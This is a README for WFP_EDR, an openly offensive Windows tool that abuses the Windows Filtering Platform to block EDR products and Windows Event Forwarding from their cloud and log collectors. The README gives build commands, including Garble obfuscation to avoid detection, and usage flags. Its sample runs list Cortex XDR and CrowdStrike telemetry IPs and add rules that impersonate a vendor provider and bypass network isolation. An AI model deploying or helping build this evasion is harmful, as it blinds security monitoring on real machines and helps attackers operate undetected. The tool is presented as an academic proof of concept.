# WFP_EDR

The goal of this project is on Windows Machine to abuse the WFP (Windows Filtering Platform) or also known as the Windows Firewall, to stop communication with the Cloud part of the EDRs.  
It requires to be runned as privileged user.  

# Disclaimer  
This tool is intended solely for academic purposes and must not be utilized for any unlawful activities or any activities that breach ethical guidelines and regulations.

# Known technique
I stumbled on reading Nightawk 0.2.6 release note, and it seems this eaxct same idea of blocking flow has been implemented with their FireBlock

# Build
```
cd WFP_experiments  
go mod init wfp_edr
go get inet.af/wf   
go get x/sys/windows  
go get x/sys/windows/registry  
  
go run wfp_edr.go  
go build wfp_edr.go
```
# Build obfuscated
With String obfuscations library Garble
```
go install mvdan.cc/garble@latest
... (your path should contain garble.exe)  
garble -tiny -literals -seed=random build wfp_edr.go
```

## Usage
```

C:\Temp\hello>wfp_edr.exe -help
Usage of wfp_edr.exe:
 -file string
        Specify a json file path
  -getcortex
        Get Cortex XDR proxy config and generate a WFP config
  -getwec
        Get WEC Config and generate a WFP config
  -install
        Install WFP rules (requires the file option)
  -output string
        Specify output file. To be used in conjonction with generating with getwec or getcortex
  -print
        Print WFP Providers and SubLayers

```

## Get WEC  
This option is to read WEF (Windows Event Forwarding) configuration from Registry.  
Which will prevent sending logs to the WEC (Windows Event Collector).   
```
C:\Temp\hello>wfp_edr.exe -getwec
Let's get WEC config from registry...
[+] Registry key is present
[+] Found WEC entry

        Server=http://2019RDS.timatec.local:5985/wsman/SubscriptionManager/WEC,Refresh=60
        Host: 2019RDS.timatec.local
        Port: 5985
        IP Address: 192.168.16.24
=========================================== WEC.json config example ===============================
{
        "Provider": {
                "Provider_name": "WFP_EDR",
                "Provider_ID": "{12345678-AAAA-BBBB-CCCC-123456789012}"
        },
        "Sublayer": {
                "Sublayer_name" : "WFP_EDR_WEC",
                "Sublayer_ID" : "{12345678-AAAA-BBBB-CCCC-123456789012}"
        },
        "Block_port": "5985",
        "Block": [
                {"WEC": "192.168.16.24"}
        ]
}
```
## Get Cortex XDR

In some cases, Cortex XDR is configured to use a specifc Proxy address and Port.  
Denying access to the Cortex XDR wouldn't have any effect.   
This option is to read that configuration and generate a config json.  

```

C:\Temp\hello>wfp_edr.exe -getcortex
Let's get Cortex XDR Proxy config...
IP = 192.168.1.3 Port = 8080
IP = 192.168.1.2 Port = 8080
=========================================== XDR.json config example ===============================
{
        "Provider": {
                "Provider_name": "WFP_EDR",
                "Provider_ID": "{12345678-AAAA-BBBB-CCCC-123456789012}"
        },
        "Sublayer": {
                "Sublayer_name" : "WFP_EDR_WEC",
                "Sublayer_ID" : "{12345678-AAAA-BBBB-CCCC-123456789012}"
        },
        "Block_port": "8080",
        "Block": [
                {"CortexProxy0": "192.168.1.3"},
                {"CortexProxy1": "192.168.1.2"}
        ]
}

```
     
## Install for Cortex XDR

```
C:\Temp\hello>wfp_edr.exe -install -file xdr.json
[+] Starting Anti EDR with WFP filters
[+] Config file parsed
[+] Created new Session name = 'EDR Offensive tool POC with WFP'
[+] Adding Provider name = ' Palo Alto Networks Corporation - Cortex XDR Network Isolation ' providerID =  {4544A023-2767-411C-86E4-3EA52A4AA172}  Persistent = false
[+] Adding sublayer ID = ' {849BDEF4-C2D5-4464-96E8-3CBE11841AD6} '
[+] Adding sublayer guid =  {849BDEF4-C2D5-4464-96E8-3CBE11841AD6}  name =  Palo Alto Networks Corporation - Cortex XDR Network Isolation  Isolation weight 0xffff
  [+] Name: Live-EU, IP: 35.244.251.25
  [+] Name: Live-CH, IP: 34.65.213.226
  [+] Name: Live-DE, IP: 34.107.61.141
  [+] Name: Live-US, IP: 35.190.88.43
  [+] Name: Live-CA, IP: 35.203.99.74
  [+] Name: Live-UK, IP: 35.242.159.176
  [+] Name: Live-JP, IP: 34.84.201.32
  [+] Name: Live-SG, IP: 34.87.61.186
  [+] Name: Live-AU, IP: 35.244.66.177
  [+] Name: Live-IN, IP: 35.200.146.253
  [+] Name: Live-PL, IP: 34.118.62.80
  [+] Name: EDR-EU, IP: 34.102.140.103
  [+] Name: EDR-CH, IP: 34.149.180.250
  [+] Name: EDR-DE, IP: 34.107.161.143
  [+] Name: EDR-US, IP: 34.98.77.231
  [+] Name: EDR-CA, IP: 34.96.120.25
  [+] Name: EDR-UK, IP: 35.244.133.254
  [+] Name: EDR-JP, IP: 34.95.66.187
  [+] Name: EDR-SG, IP: 34.120.142.18
  [+] Name: EDR-AU, IP: 34.102.237.151
  [+] Name: EDR-IN, IP: 34.120.213.187
  [+] Name: EDR-PL, IP: 35.190.13.237
  [+] Block_port: 443
[+] Adding WFP rule to block EDR flow guid =  {A6F6E557-83E2-444D-AF8B-01ABE35A1C07}  name = 'EDR_BLOCKING_RULE' for layer =  ALE_AUTH_CONNECT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {A40F1C2F-6482-45AE-91ED-77CF843A7284}  name = 'EDR_Isolate_bypass_RULE' for layer =  ALE_AUTH_RECV_ACCEPT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {011B4595-47F9-40A9-9A69-E11C80A0D8A0}  name = 'EDR_Isolate_bypass_RULE' for layer =  ALE_AUTH_CONNECT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {BB76DF75-97BE-4CCC-B4FE-02E23CAC8BBC}  name = 'EDR_Isolate_bypass_RULE' for layer =  OUTBOUND_TRANSPORT_V4
[+] Adding WFP rule to Allow ANY ICMPv4 guid =  {6A05C13C-5ACB-490C-B423-230B8E5FC152}  name = 'EDR_Isolate_bypass_ICMP_RULE' for layer =  OUTBOUND_ICMP_ERROR_V4
[+] Adding WFP rule to Allow ANY ICMPv4 guid =  {BBCD92A9-63F1-4891-BD94-EBCB150B336B}  name = 'EDR_Isolate_bypass_ICMP_RULE' for layer =  INBOUND_ICMP_ERROR_V4
==> Press ENTER to finish and remove tempory WFP rules...

[+] Finished
```

## Install for CrowdStrike
```
wfp_edr.exe -install -file cs.json
[+] Starting Anti EDR with WFP filters
[+] Config file parsed
[+] Created new Session name = 'EDR Offensive tool POC with WFP'
An object with that GUID or LUID already exists.
[!]  Provider ID already exists !!! Failed creation of new Provider ! not an issue, let's continue ...

[+] Adding sublayer ID = ' {6F4CF567-44A9-4D00-AA33-E2F2AFE237C2} '
An object with that GUID or LUID already exists.
[!] SubLayer ID already exists !!! not an issue, let's continue ...

  [+] Name: Term-EU1, IP: 3.121.6.180
  [+] Name: Term-EU2, IP: 3.121.187.176
  [+] Name: Term-EU3, IP: 3.121.238.86
  [+] Name: Term-EU4, IP: 3.125.15.130
  [+] Name: Term-EU5, IP: 18.158.187.80
  [+] Name: Term-EU6, IP: 18.198.53.88
  [+] Name: LFO-download1, IP: 3.78.32.129
  [+] Name: LFO-download2, IP: 3.121.13.180
  [+] Name: LFO-download3, IP: 3.123.240.202
  [+] Name: LFO-download4, IP: 18.184.114.155
  [+] Name: LFO-download5, IP: 18.194.8.224
  [+] Name: LFO-download6, IP: 35.156.219.65
  [+] Name: LFO-upload1, IP: 3.69.184.79
  [+] Name: LFO-upload2, IP: 3.76.143.53
  [+] Name: LFO-upload3, IP: 3.77.82.22
  [+] Name: LFO-forensic1, IP: 3.69.184.79
  [+] Name: LFO-forensic2, IP: 3.127.43.50
  [+] Name: LFO-forensic3, IP: 18.193.144.218
  [+] Block_port: 443
[+] Adding WFP rule to block EDR flow guid =  {B6865DBE-B0D4-46CA-9C89-9FFA4DCD8117}  name = 'EDR_BLOCKING_RULE' for layer =  ALE_AUTH_CONNECT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {CB344E06-B66C-4A7E-B25F-F2C180703830}  name = 'EDR_Isolate_bypass_RULE' for layer =  ALE_AUTH_RECV_ACCEPT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {DE9CF584-DA37-473B-9C9C-4573DE898B3B}  name = 'EDR_Isolate_bypass_RULE' for layer =  ALE_AUTH_CONNECT_V4
[+] adding WFP rule to Allow rule to bypass ISOLATION guid =  {827DE277-2ADD-43DF-AE69-AEB75F5A2524}  name = 'EDR_Isolate_bypass_RULE' for layer =  OUTBOUND_TRANSPORT_V4
[+] Adding WFP rule to Allow ANY ICMPv4 guid =  {9AAAF2B8-8BDC-4050-806F-190D7A64A0D1}  name = 'EDR_Isolate_bypass_ICMP_RULE' for layer =  OUTBOUND_ICMP_ERROR_V4
[+] Adding WFP rule to Allow ANY ICMPv4 guid =  {E64B2239-9B71-4888-87C1-F5231C8F03EE}  name = 'EDR_Isolate_bypass_ICMP_RULE' for layer =  INBOUND_ICMP_ERROR_V4
==> Press ENTER to finish and remove tempory WFP rules...
```
